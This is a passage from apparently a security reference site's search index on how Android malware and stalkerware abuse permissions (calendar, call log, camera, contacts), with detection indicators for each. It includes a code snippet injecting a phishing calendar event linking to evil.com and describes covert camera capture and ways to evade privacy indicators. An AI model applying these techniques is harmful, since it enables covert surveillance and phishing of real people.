API.</p>"},{"location":"permissions/activity-recognition/activity-recognition/#what-it-enables","title":"What It Enables","text":"<p>Access to <code>ActivityRecognitionClient</code> (Google Play Services) or <code>SensorManager</code> for motion classification:</p> Activity Detection Still Device stationary Walking Pedestrian movement Running Fast pedestrian movement Cycling Bicycle movement In vehicle Automotive movement Tilting Device orientation change Unknown Unclassified movement"},{"location":"permissions/activity-recognition/activity-recognition/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/activity-recognition/activity-recognition/#behavioral-profiling","title":"Behavioral Profiling","text":"<p>Stalkerware uses activity data to track daily patterns:</p> <ul> <li>When the target leaves home (transitions from still to walking/driving)</li> <li>Commute patterns and timing</li> <li>Exercise routines</li> <li>Sleep schedule (extended still periods)</li> </ul>"},{"location":"permissions/activity-recognition/activity-recognition/#trigger-based-actions","title":"Trigger-Based Actions","text":"<p>Malware can trigger specific actions based on activity:</p> <ul> <li>Start location tracking when the user begins driving</li> <li>Activate microphone recording when the user is stationary (in a meeting)</li> <li>Defer data exfiltration until the user is in vehicle (likely not looking at phone)</li> </ul>"},{"location":"permissions/activity-recognition/activity-recognition/#context-enhancement","title":"Context Enhancement","text":"<p>Activity data combined with location creates richer surveillance: not just where someone is, but what they're doing there.</p>"},{"location":"permissions/activity-recognition/activity-recognition/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.ACTIVITY_RECOGNITION\" /&gt;\n</code></pre> <p>Expected in fitness, navigation, and transportation apps. Suspicious in apps with no movement-related functionality.</p>"},{"location":"permissions/calendar/","title":"Calendar Permissions","text":"<p>Access to calendar events, attendees, and reminders. Lower priority for most malware compared to SMS or contacts, but useful for targeted espionage: reading meeting details, attendee lists, and locations reveals a target's schedule and professional contacts.</p>"},{"location":"permissions/calendar/#permissions","title":"Permissions","text":"Permission Abuse Potential READ_CALENDAR Exfiltrate meeting details, schedules, attendee contact info WRITE_CALENDAR Inject fake events for social engineering, modify existing events"},{"location":"permissions/calendar/#spyware-families","title":"Spyware Families","text":"<p>Calendar exfiltration is a staple of targeted espionage toolkits:</p> Family Calendar Usage Pegasus (NSO Group) Exfiltrates full calendar database including attendees, locations, and notes FinSpy (Gamma Group) Reads calendar entries as part of broad PIM (Personal Information Manager) harvesting Hermit (RCS Lab) Collects calendar data alongside contacts and messages for target profiling AridSpy Exfiltrates calendar events from compromised devices in targeted Middle Eastern operations"},{"location":"permissions/calendar/#attack-scenarios","title":"Attack Scenarios","text":"<p>Meeting reconnaissance -- Calendar entries reveal where a target will be, when, and with whom. For a high-value target, this enables physical surveillance planning, room bugging, or interception at known future locations.</p> <p>Executive surveillance -- Corporate espionage operators harvest calendar data to map organizational structure. Recurring meetings with specific attendees reveal reporting lines, project teams, and decision-making circles that are not visible from an org chart alone.</p> <p>Social engineering with event details -- Stolen calendar data fuels highly convincing pretexting. An attacker who knows the target has a \"Q3 Budget Review with Sarah Chen at 2pm\" can craft a phishing email referencing that exact meeting, dramatically increasing the success rate.</p>"},{"location":"permissions/calendar/#write_calendar-abuse","title":"WRITE_CALENDAR Abuse","text":"<p><code>WRITE_CALENDAR</code> enables a subtle but effective attack vector: injecting phishing events directly into a target's calendar. The injected event includes a title like \"Action Required: Verify Account\" and a description containing a malicious URL. When the calendar fires a notification reminder, the target sees what appears to be a legitimate calendar event and clicks through.</p> <p>This technique bypasses email-based phishing defenses entirely. The malicious link never passes through an email gateway, spam filter, or URL scanner. It surfaces through a trusted channel -- the user's own calendar notifications -- and inherits the implicit trust that users place in their personal schedule.</p>"},{"location":"permissions/calendar/read-calendar/","title":"READ_CALENDAR","text":"<p>Allows reading all calendar events, attendees, and reminders from the device's calendar provider. Primarily relevant to targeted spyware and stalkerware rather than commodity malware.</p>"},{"location":"permissions/calendar/read-calendar/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.READ_CALENDAR</code> Protection Level <code>dangerous</code> Permission Group <code>CALENDAR</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/calendar/read-calendar/#what-it-enables","title":"What It Enables","text":"<p>Access to the <code>CalendarContract</code> content provider:</p> <pre><code>Cursor cursor = getContentResolver().query(\n    CalendarContract.Events.CONTENT_URI,\n    new String[]{\n        CalendarContract.Events.TITLE,\n        CalendarContract.Events.DTSTART,\n        CalendarContract.Events.EVENT_LOCATION,\n        CalendarContract.Events.DESCRIPTION\n    },\n    null, null, null\n);\n</code></pre> <p>Available data:</p> Data Field Event title <code>Events.TITLE</code> Start/end time <code>Events.DTSTART</code>, <code>Events.DTEND</code> Location <code>Events.EVENT_LOCATION</code> Description <code>Events.DESCRIPTION</code> Attendees <code>Attendees.ATTENDEE_EMAIL</code>, <code>ATTENDEE_NAME</code> Reminders <code>Reminders.MINUTES</code>, <code>METHOD</code> Calendar account <code>Calendars.ACCOUNT_NAME</code>"},{"location":"permissions/calendar/read-calendar/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/calendar/read-calendar/#targeted-espionage","title":"Targeted Espionage","text":"<p>Spyware targeting specific individuals extracts calendar data to map:</p> <ul> <li>Daily schedule and routines</li> <li>Meeting locations (physical surveillance planning)</li> <li>Professional contacts via attendee lists</li> <li>Business travel patterns</li> <li>Conference call details and dial-in numbers</li> </ul>"},{"location":"permissions/calendar/read-calendar/#commercial-spyware","title":"Commercial Spyware","text":"<p>Nation-state spyware (Pegasus, Predator) and commercial stalkerware apps routinely exfiltrate calendar data as part of full device surveillance.</p>"},{"location":"permissions/calendar/read-calendar/#low-priority-for-banking-trojans","title":"Low Priority for Banking Trojans","text":"<p>Most banking malware does not request calendar permissions. The data has no direct value for financial fraud.</p>"},{"location":"permissions/calendar/read-calendar/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.READ_CALENDAR\" /&gt;\n</code></pre> <p>Calendar access combined with other surveillance permissions (location, microphone, camera, contacts) suggests spyware. Calendar access alone is common in legitimate productivity apps.</p>"},{"location":"permissions/calendar/write-calendar/","title":"WRITE_CALENDAR","text":"<p>Allows creating, modifying, and deleting calendar events. Can be used for social engineering by injecting fake events with malicious links or phishing content into the victim's calendar.</p>"},{"location":"permissions/calendar/write-calendar/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.WRITE_CALENDAR</code> Protection Level <code>dangerous</code> Permission Group <code>CALENDAR</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/calendar/write-calendar/#what-it-enables","title":"What It Enables","text":"<p>Create, update, and delete events via <code>CalendarContract</code>:</p> <pre><code>ContentValues values = new ContentValues();\nvalues.put(CalendarContract.Events.TITLE, \"Security Alert: Verify Your Account\");\nvalues.put(CalendarContract.Events.DESCRIPTION, \"Click here: https://evil.com/phishing\");\nvalues.put(CalendarContract.Events.DTSTART, System.currentTimeMillis() + 3600000);\nvalues.put(CalendarContract.Events.DTEND, System.currentTimeMillis() + 7200000);\nvalues.put(CalendarContract.Events.CALENDAR_ID, 1);\nvalues.put(CalendarContract.Events.EVENT_TIMEZONE, TimeZone.getDefault().getID());\ngetContentResolver().insert(CalendarContract.Events.CONTENT_URI, values);\n</code></pre>"},{"location":"permissions/calendar/write-calendar/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/calendar/write-calendar/#calendar-spam-phishing","title":"Calendar Spam / Phishing","text":"<p>Inject events containing phishing links into the victim's calendar. When the calendar notification fires, the user sees what appears to be a legitimate reminder with a malicious URL. This technique has been used in iOS calendar spam campaigns and applies equally to Android.</p>"},{"location":"permissions/calendar/write-calendar/#event-manipulation","title":"Event Manipulation","text":"<p>Modify or delete existing events to disrupt a target's schedule (targeted harassment or sabotage).</p>"},{"location":"permissions/calendar/write-calendar/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.WRITE_CALENDAR\" /&gt;\n</code></pre> <p>Less commonly requested than <code>READ_CALENDAR</code>. Any app requesting write access without clear calendar management functionality is suspicious.</p>"},{"location":"permissions/call-log/","title":"Call Log Permissions","text":"<p>Access to the device's call history database. Call logs expose who the user communicates with, when, how often, and for how long. Valuable for spyware operators conducting surveillance, social graph mapping, and building behavioral profiles. Heavily restricted by Google Play since January 2019.</p>"},{"location":"permissions/call-log/#permissions","title":"Permissions","text":"Permission Abuse Potential READ_CALL_LOG Read complete call history: numbers, timestamps, duration, call type WRITE_CALL_LOG Insert or delete call records, cover tracks after malicious calls PROCESS_OUTGOING_CALLS Intercept outgoing calls, redirect to attacker-controlled numbers"},{"location":"permissions/call-log/#why-call-logs-matter-offensively","title":"Why Call Logs Matter Offensively","text":"<p>Call history provides a structured communication timeline. Unlike contacts (which are static), call logs show active relationships: who the target actually talks to, how frequently, and when. This data enables:</p> <ul> <li>Social graph mapping: identify close contacts by call frequency and duration</li> <li>Behavioral profiling: establish daily patterns, working hours, travel (via timezone-shifted calling patterns)</li> <li>Contact discovery: phone numbers in call logs may not exist in the contacts database</li> <li>Surveillance verification: confirm whether a target communicated with a specific number</li> <li>Correlation attacks: cross-reference call logs from multiple compromised devices to map networks</li> </ul>"},{"location":"permissions/call-log/#play-store-policy","title":"Play Store Policy","text":"<p>Since January 2019, Google restricts Call Log permissions to apps declared as the default dialer or that have an approved use case (call screening, caller ID). Apps that cannot justify the need are rejected from Play Store.</p> <p>This policy change pushed call log-stealing malware toward:</p> <ul> <li>Distribution via sideloading and third-party stores</li> <li>Using accessibility services to read call information from the screen instead</li> <li>Using notification listener to capture incoming call notifications</li> <li>Targeting pre-2019 devices where the restriction does not apply</li> </ul>"},{"location":"permissions/call-log/#common-permission-combinations","title":"Common Permission Combinations","text":"Combination Purpose <code>READ_CALL_LOG</code> + <code>READ_CONTACTS</code> Full communication graph: who the target knows and who they actually talk to <code>READ_CALL_LOG</code> + <code>READ_SMS</code> Complete communication surveillance across channels <code>READ_CALL_LOG</code> + <code>INTERNET</code> Call history exfiltration to C2 <code>WRITE_CALL_LOG</code> + <code>CALL_PHONE</code> Make calls and erase evidence from the log"},{"location":"permissions/call-log/process-outgoing-calls/","title":"PROCESS_OUTGOING_CALLS","text":"<p>Allows monitoring and redirecting outgoing phone calls. The app can see the number being dialed and optionally modify or cancel the call. Deprecated in Android 10.</p>"},{"location":"permissions/call-log/process-outgoing-calls/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.PROCESS_OUTGOING_CALLS</code> Protection Level <code>dangerous</code> Permission Group <code>CALL_LOG</code> Grant Method Runtime permission dialog Introduced API 1 Deprecated API 29 (Android 10)"},{"location":"permissions/call-log/process-outgoing-calls/#what-it-enables","title":"What It Enables","text":"<p>Receive <code>NEW_OUTGOING_CALL</code> broadcast before a call is placed:</p> <pre><code>public class OutgoingCallReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        String number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);\n        // Can modify: setResultData(newNumber)\n        // Can cancel: setResultData(null)\n    }\n}\n</code></pre>"},{"location":"permissions/call-log/process-outgoing-calls/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/call-log/process-outgoing-calls/#call-redirection","title":"Call Redirection","text":"<p>Redirect calls to the bank's customer service number to an attacker-controlled number. The victim dials their bank, but the call goes to the attacker's call center.</p>"},{"location":"permissions/call-log/process-outgoing-calls/#call-monitoring","title":"Call Monitoring","text":"<p>Log all outgoing calls (number, time) for surveillance.</p>"},{"location":"permissions/call-log/process-outgoing-calls/#premium-number-substitution","title":"Premium Number Substitution","text":"<p>Replace outgoing call numbers with premium-rate numbers.</p>"},{"location":"permissions/call-log/process-outgoing-calls/#android-version-changes","title":"Android Version Changes","text":"<p>Android 10 (API 29): deprecated. Replaced by <code>CallRedirectionService</code> role, which requires the user to explicitly set the app as the call redirection handler. Existing apps targeting older APIs still receive the broadcast.</p>"},{"location":"permissions/call-log/process-outgoing-calls/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.PROCESS_OUTGOING_CALLS\" /&gt;\n</code></pre> <p>Deprecated. Presence in modern apps targeting API 29+ is suspicious.</p>"},{"location":"permissions/call-log/read-call-log/","title":"READ_CALL_LOG","text":"<p>Grants read access to the device's call history via the CallLog content provider. Used by spyware for surveillance, social graph reconstruction, and behavioral profiling. Google Play has restricted this permission since January 2019, limiting distribution of apps that request it to those declared as the default dialer or with an approved use case.</p>"},{"location":"permissions/call-log/read-call-log/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.READ_CALL_LOG</code> Protection Level <code>dangerous</code> Permission Group <code>CALL_LOG</code> Grant Method Runtime permission dialog Introduced API 16 (Android 4.1)"},{"location":"permissions/call-log/read-call-log/#what-it-enables","title":"What It Enables","text":"<p>Access to the call log content provider at <code>content://call_log/calls</code>. The app can query the complete call history stored on the device.</p> <pre><code>Cursor cursor = getContentResolver().query(\n    CallLog.Calls.CONTENT_URI,\n    null, null, null,\n    CallLog.Calls.DATE + \" DESC\"\n);\n</code></pre> <p>Data available per call record:</p> Field Content <code>NUMBER</code> Phone number of the other party <code>TYPE</code> Incoming (1), outgoing (2), missed (3), voicemail (4), rejected (5), blocked (6) <code>DATE</code> Timestamp of the call <code>DURATION</code> Call duration in seconds <code>CACHED_NAME</code> Contact name (if matched at call time) <code>CACHED_NUMBER_TYPE</code> Number type (mobile, home, work) <code>GEOCODED_LOCATION</code> Geographic label for the number <code>PHONE_ACCOUNT_ID</code> SIM or VoIP account used <code>IS_READ</code> Whether the missed call notification was seen <p>On most devices, the call log retains the last 500-1000 entries, depending on the manufacturer. Some OEMs keep significantly more.</p>"},{"location":"permissions/call-log/read-call-log/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/call-log/read-call-log/#surveillance-and-monitoring","title":"Surveillance and Monitoring","text":"<p>The primary use case in commercial spyware and stalkerware. Call logs provide a timestamped record of all voice communications. Spyware exfiltrates this data periodically to a C2 server, giving operators a real-time view of the target's calling activity.</p> <p>Notable families:</p> Family Call Log Usage Pegasus (NSO) Full call log exfiltration as part of comprehensive device surveillance Predator (Cytrox) Call history collection alongside other communication data Hermit (RCS Lab) Call log theft combined with call recording PhoneSpy Periodic call log dump to C2 Dracarys (Meta attribution) Call log exfiltration with contact and SMS data GravityRAT Call log theft targeting Indian and Pakistani users"},{"location":"permissions/call-log/read-call-log/#social-graph-mapping","title":"Social Graph Mapping","text":"<p>Call frequency and duration data reveals relationship strength. By analyzing call logs from a compromised device, an attacker can identify:</p> <ul> <li>The target's closest contacts (highest call frequency and duration)</li> <li>Work relationships (calls during business hours, short duration)</li> <li>Personal relationships (evening/weekend calls, longer duration)</li> <li>New or unusual contacts (recent entries not in the contacts database)</li> </ul> <p>When call logs from multiple compromised devices are correlated, entire organizational or social networks can be mapped.</p>"},{"location":"permissions/call-log/read-call-log/#behavioral-profiling","title":"Behavioral Profiling","text":"<p>Call timing patterns reveal daily routines:</p> <ul> <li>Sleep schedule (gap in calls)</li> <li>Work hours (consistent call patterns)</li> <li>Travel (calls to/from unusual area codes, international numbers)</li> <li>Meeting schedules (periods of no calls followed by clusters)</li> </ul>"},{"location":"permissions/call-log/read-call-log/#contact-discovery","title":"Contact Discovery","text":"<p>Phone numbers appearing in call logs but absent from the contacts database are especially interesting. These may represent:</p> <ul> <li>Burner phones</li> <li>Contacts the target has not saved (possibly sensitive)</li> <li>Numbers the target called once (services, temporary contacts)</li> </ul>"},{"location":"permissions/call-log/read-call-log/#android-version-changes","title":"Android Version Changes","text":"<p>Prior to API 16: call log access was bundled with <code>READ_CONTACTS</code>. No separate permission existed.</p> <p>Android 4.1 (API 16): <code>READ_CALL_LOG</code> introduced as a separate permission, decoupled from contacts.</p> <p>Android 6.0 (API 23): runtime permission required. <code>READ_CALL_LOG</code> was initially part of the <code>PHONE</code> permission group.</p> <p>Android 9.0 (API 28): <code>CALL_LOG</code> became its own permission group, separate from <code>PHONE</code>. Granting <code>READ_PHONE_STATE</code> no longer implicitly granted call log access.</p> <p>Android 10 (API 29): further isolation. Call log access strictly requires <code>READ_CALL_LOG</code>. No other permission grants indirect access.</p> <p>Google Play Policy (January 2019): only apps declared as the default dialer or with an approved exception may request <code>READ_CALL_LOG</code>. This does not affect sideloaded apps or apps distributed outside Play Store.</p>"},{"location":"permissions/call-log/read-call-log/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.READ_CALL_LOG\" /&gt;\n</code></pre> <p>High-risk indicators:</p> <ul> <li>Any app that is not a dialer, contacts manager, or call screening service requesting this permission</li> <li>Combined with <code>INTERNET</code> and <code>RECEIVE_BOOT_COMPLETED</code>: periodic exfiltration with persistence</li> <li>Combined with <code>READ_CONTACTS</code> and <code>READ_SMS</code>: comprehensive communication surveillance</li> <li><code>ContentResolver.query()</code> calls targeting <code>CallLog.Calls.CONTENT_URI</code> in background services</li> <li>Bulk queries with no date filtering (dumping entire call history rather than recent entries)</li> <li>Call log data being serialized to JSON/protobuf and written to files or sent over network</li> </ul>"},{"location":"permissions/call-log/write-call-log/","title":"WRITE_CALL_LOG","text":"<p>Allows inserting, modifying, and deleting call log entries. Can be used to hide evidence of calls made by malware (e.g., premium number calls, C2 voice calls) or to inject fake call records.</p>"},{"location":"permissions/call-log/write-call-log/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.WRITE_CALL_LOG</code> Protection Level <code>dangerous</code> Permission Group <code>CALL_LOG</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/call-log/write-call-log/#what-it-enables","title":"What It Enables","text":"<p>Write access to the <code>CallLog</code> content provider:</p> <pre><code>getContentResolver().delete(\n    CallLog.Calls.CONTENT_URI,\n    CallLog.Calls.NUMBER + \" = ?\",\n    new String[]{\"+1234567890\"}\n);\n</code></pre>"},{"location":"permissions/call-log/write-call-log/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/call-log/write-call-log/#evidence-removal","title":"Evidence Removal","text":"<p>After making premium-rate calls or C2 voice calls, malware deletes the call log entries to hide activity from the user.</p>"},{"location":"permissions/call-log/write-call-log/#call-log-manipulation","title":"Call Log Manipulation","text":"<p>Inject fake call records or modify timestamps to create alibis or frame targets.</p>"},{"location":"permissions/call-log/write-call-log/#android-version-changes","title":"Android Version Changes","text":"<p>Subject to the same Google Play policy restrictions as SMS permissions since January 2019. Only default dialer/phone apps can access call log without scrutiny.</p>"},{"location":"permissions/call-log/write-call-log/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.WRITE_CALL_LOG\" /&gt;\n</code></pre> <p>Only expected in dialer and call management apps.</p>"},{"location":"permissions/camera/","title":"Camera Permissions","text":"<p>Camera access grants the ability to capture photos and video from device cameras without the user physically pressing a shutter button. In an offense context, this permission enables covert environmental surveillance: photographing the victim, recording their surroundings, and capturing documents or screens visible to the camera.</p> <p>Stalkerware and state-sponsored spyware treat camera access as a core collection capability. Commercial spyware like Pegasus, Predator, and FinFisher all implement covert camera capture. Consumer-grade stalkerware apps marketed for \"parental monitoring\" or \"employee tracking\" rely on it heavily.</p>"},{"location":"permissions/camera/#permissions","title":"Permissions","text":"Permission Abuse Potential CAMERA Covert photo/video capture, environmental surveillance, QR code scanning for data exfiltration"},{"location":"permissions/camera/#key-considerations","title":"Key Considerations","text":"<p>Unlike permission groups with multiple members (SMS, Phone), the camera group contains a single runtime permission. However, effective camera abuse typically requires combining it with other permissions:</p> Combo Purpose <code>CAMERA</code> + <code>RECORD_AUDIO</code> Video with audio surveillance <code>CAMERA</code> + <code>INTERNET</code> Real-time streaming or image exfiltration <code>CAMERA</code> + <code>WRITE_EXTERNAL_STORAGE</code> Save captured media to disk for later exfiltration <code>CAMERA</code> + <code>FOREGROUND_SERVICE</code> (type <code>camera</code>) Sustained capture from background (Android 14+) <code>CAMERA</code> + <code>SYSTEM_ALERT_WINDOW</code> Overlay to hide camera preview while capturing"},{"location":"permissions/camera/#covert-capture-techniques","title":"Covert Capture Techniques","text":"<p>Silent camera capture requires suppressing the preview and shutter sound. Methods used by malware:</p> <ul> <li>1x1 pixel preview surface: create a <code>SurfaceView</code> or <code>TextureView</code> of 1x1 pixels, invisible to the user but sufficient for the camera API to operate</li> <li>Camera2 API with ImageReader: <code>ImageReader</code> as output surface with no preview, capturing directly to memory</li> <li>Overlay window: <code>SYSTEM_ALERT_WINDOW</code> places a transparent overlay that contains the preview surface, invisible to the user</li> <li>Foreground service: keeps the camera session alive when the app is not in the foreground</li> </ul> <p>Shutter sound suppression varies by region. In Japan and South Korea, the shutter sound is mandatory at the firmware level and cannot be muted programmatically. In other regions, malware mutes media volume before capture.</p>"},{"location":"permissions/camera/camera/","title":"CAMERA","text":"<p>Grants access to device cameras (front and rear) for photo and video capture. Used by spyware for covert environmental surveillance, capturing the victim's face, surroundings, and any documents or screens in view. One of the most privacy-invasive permissions, and a standard capability in both commercial spyware and stalkerware.</p>"},{"location":"permissions/camera/camera/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.CAMERA</code> Protection Level <code>dangerous</code> Permission Group <code>CAMERA</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/camera/camera/#what-it-enables","title":"What It Enables","text":"<p>Two camera APIs exist on Android:</p>"},{"location":"permissions/camera/camera/#camera1-deprecated","title":"Camera1 (Deprecated)","text":"<pre><code>Camera camera = Camera.open(0);\ncamera.setPreviewTexture(surfaceTexture);\ncamera.startPreview();\ncamera.takePicture(null, null, pictureCallback);\n</code></pre> <p>Requires a preview surface. Malware uses a 1x1 pixel <code>SurfaceTexture</code> to satisfy this requirement invisibly.</p>"},{"location":"permissions/camera/camera/#camera2-api-21","title":"Camera2 (API 21+)","text":"<pre><code>CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);\nmanager.openCamera(cameraId, stateCallback, handler);\n</code></pre> <p>Camera2 supports <code>ImageReader</code> as an output target, enabling capture directly to a byte buffer without any visible preview. This is the preferred API for covert capture.</p>"},{"location":"permissions/camera/camera/#camerax-jetpack","title":"CameraX (Jetpack)","text":"<p>Higher-level abstraction over Camera2. Some stalkerware uses CameraX for simpler implementation, though Camera2 provides more control for stealth.</p>"},{"location":"permissions/camera/camera/#available-data","title":"Available Data","text":"Capability Details Still photos Full sensor resolution, front and rear cameras Video recording Requires <code>MediaRecorder</code> or <code>MediaCodec</code>, up to device-supported resolution Camera metadata Lens intrinsics, sensor orientation, exposure data Camera enumeration Number of cameras, facing direction, capabilities Depth data On supported devices, ToF/structured light depth maps"},{"location":"permissions/camera/camera/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/camera/camera/#covert-photo-capture","title":"Covert Photo Capture","text":"<p>The primary abuse case. Malware captures still images silently:</p> <ol> <li>Open camera in a foreground service or with a transparent overlay</li> <li>Use a 1x1 pixel preview surface or <code>ImageReader</code>-only output</li> <li>Capture image to memory</li> <li>Compress and exfiltrate to C2 via HTTPS</li> <li>Release camera to avoid the in-use indicator on Android 12+</li> </ol> <p>Timing matters. Sophisticated spyware captures when the screen is on (camera quality is better, and the user is likely facing the front camera) or on C2 command.</p>"},{"location":"permissions/camera/camera/#covert-video-recording","title":"Covert Video Recording","text":"<p>Sustained video capture generates large files and keeps the camera session open, increasing detection risk on Android 12+ due to the persistent indicator. Malware mitigates this by:</p> <ul> <li>Recording short clips (10-30 seconds) rather than continuous video</li> <li>Compressing aggressively before exfiltration</li> <li>Recording only when triggered by C2 or on a schedule</li> <li>Combining with <code>RECORD_AUDIO</code> for video with sound</li> </ul>"},{"location":"permissions/camera/camera/#environmental-surveillance","title":"Environmental Surveillance","text":"<p>Rear camera captures the physical environment: room layout, documents on desks, computer screens, other people present. Front camera captures the user's face. Both contribute to intelligence collection in targeted espionage.</p>"},{"location":"permissions/camera/camera/#qr-code-screen-capture","title":"QR Code / Screen Capture","text":"<p>Camera pointed at another screen can read QR codes, capture credentials displayed on monitors, or photograph authentication tokens. Some malware combines camera access with OCR to extract text from captured images.</p>"},{"location":"permissions/camera/camera/#notable-families","title":"Notable Families","text":"Family Camera Usage Pegasus (NSO Group) Full camera control, covert capture on C2 command Predator (Cytrox) Camera and microphone surveillance FinSpy Scheduled photo capture, video recording Dendroid RAT Remote camera activation, photo + video DroidJack / SandroRAT Live camera streaming to C2 Hermit (RCS Lab) Camera capture as part of lawful intercept toolkit PhoneSpy Stalkerware with continuous camera access Mandrake Camera-based environment profiling BoneSpy Covert photo capture for Gamaredon-linked espionage operations PlainGnome Camera capture in second-stage surveillance payload EagleMsgSpy Remote camera activation for law enforcement surveillance KoSpy Camera capture for North Korean intelligence collection AridSpy Covert photo capture in multi-stage spyware framework PJobRAT Camera access for military-targeted espionage in South Asia LightSpy Dedicated camera plugin for photo and video capture SpyNote Remote camera activation and live streaming to operator"},{"location":"permissions/camera/camera/#android-version-changes","title":"Android Version Changes","text":"<p>Android 1.0 (API 1): <code>CAMERA</code> permission introduced. No runtime prompt.</p> <p>Android 6.0 (API 23): runtime permission required. User must explicitly grant.</p> <p>Android 9 (API 28): apps in the background cannot access the camera. Background camera use requires a foreground service. This was the first significant restriction on covert capture.</p> <p>Android 11 (API 30): one-time permissions introduced. Users can grant camera access for a single session only. The permission auto-revokes when the app moves to the background.</p> <p>Android 12 (API 31): privacy indicators added. A green dot appears in the status bar whenever the camera is in use. Users can see which app is accessing the camera by tapping the indicator. This is the single largest detection improvement for covert camera abuse.</p> <p>Android 12: quick settings toggles to disable camera and microphone globally. Even with the permission granted, the hardware is blocked when the toggle is off.</p> <p>Android 14 (API 34): foreground service type <code>camera</code> required. Apps must declare <code>android:foregroundServiceType=\"camera\"</code> in the manifest and in the <code>ServiceInfo</code>. Without this, camera access from a foreground service throws a <code>SecurityException</code>.</p> <p>Android 15 (API 35): further restrictions on foreground service types and background activity launches tighten the window for covert capture.</p>"},{"location":"permissions/camera/camera/#evasion-of-privacy-indicators","title":"Evasion of Privacy Indicators","text":"<p>The Android 12+ camera indicator is a significant obstacle. Known bypass approaches:</p> Technique Status Root + system app privileges Bypass indicators entirely (system camera service) Capture in sub-second bursts Indicator appears briefly, easy to miss Exploit camera HAL directly Device-specific, requires kernel/vendor exploit Use deprecated Camera1 API Indicator still applies (not a bypass) Disable indicator via ADB Requires prior ADB access, <code>settings put</code> command <p>On rooted devices or with a platform-level exploit, spyware can access the camera through the HAL layer or as a system process, avoiding the indicator entirely.</p>"},{"location":"permissions/camera/camera/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.CAMERA\" /&gt;\n</code></pre> <p>Static analysis indicators:</p> <ul> <li><code>CameraManager.openCamera()</code> or <code>Camera.open()</code> calls</li> <li><code>ImageReader</code> allocated without a corresponding visible <code>SurfaceView</code> in any layout XML</li> <li>1x1 dimension <code>SurfaceTexture</code> or <code>SurfaceView</code> creation</li> <li>Camera access combined with <code>INTERNET</code> permission and no camera-related UI in the app</li> <li><code>MediaRecorder</code> configured with <code>VideoSource.CAMERA</code> in a service rather than an activity</li> <li>Foreground service declared with type <code>camera</code> but no user-facing camera feature</li> </ul> <p>Runtime indicators on Android 12+: the green privacy indicator dot and the quick settings panel showing the accessing app.</p>"},{"location":"permissions/contacts/","title":"Contacts Permissions","text":"<p>Access to the device contact database and associated account information. Contacts are a high-value target for malware: they provide ready-made phone number lists for SMS worm propagation, social graph data for targeted phishing, and personal details (names, emails, addresses) for identity theft and reconnaissance.</p>"},{"location":"permissions/contacts/#permissions","title":"Permissions","text":"Permission Abuse Potential READ_CONTACTS Exfiltrate full contact database, build target lists for SMS worms, map social graph WRITE_CONTACTS Inject fake contacts, modify existing entries for social engineering GET_ACCOUNTS Enumerate accounts (Google, Exchange, etc.) on the device for account takeover or fingerprinting"},{"location":"permissions/contacts/#why-contacts-matter-offensively","title":"Why Contacts Matter Offensively","text":"<p>The contacts database is not just a phone book. It stores structured relationships, communication metadata, and often cross-linked account identifiers. A single contacts dump yields:</p> <ul> <li>Phone numbers for SMS phishing distribution (FluBot, Medusa)</li> <li>Email addresses for spear-phishing campaigns</li> <li>Organization names and job titles for targeted attacks</li> <li>Social graph edges for mapping who knows whom</li> <li>Account identifiers tied to Google, WhatsApp, Telegram, and other services</li> </ul>"},{"location":"permissions/contacts/#play-store-policy","title":"Play Store Policy","text":"<p>Google Play does not restrict contacts permissions as aggressively as SMS or Call Log. Apps can still request <code>READ_CONTACTS</code> with relatively weak justification (contact sync, social features). This makes contacts one of the easier dangerous permissions to abuse from a distribution standpoint.</p>"},{"location":"permissions/contacts/#common-permission-combinations","title":"Common Permission Combinations","text":"Combination Purpose <code>READ_CONTACTS</code> + <code>SEND_SMS</code> SMS worm propagation to all contacts <code>READ_CONTACTS</code> + <code>INTERNET</code> Contact exfiltration to C2 <code>READ_CONTACTS</code> + <code>READ_SMS</code> Full communication graph reconstruction <code>READ_CONTACTS</code> + <code>GET_ACCOUNTS</code> Link contacts to device accounts for identity mapping"},{"location":"permissions/contacts/get-accounts/","title":"GET_ACCOUNTS","text":"<p>Allows listing the accounts registered on the device (Google, Samsung, Exchange, etc.). Reveals which services the user has accounts with, useful for targeted phishing and account enumeration.</p>"},{"location":"permissions/contacts/get-accounts/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.GET_ACCOUNTS</code> Protection Level <code>dangerous</code> Permission Group <code>CONTACTS</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/contacts/get-accounts/#what-it-enables","title":"What It Enables","text":"<pre><code>AccountManager am = AccountManager.get(context);\nAccount[] accounts = am.getAccounts();\nfor (Account account : accounts) {\n    String type = account.type;   // \"com.google\", \"com.samsung.account\", etc.\n    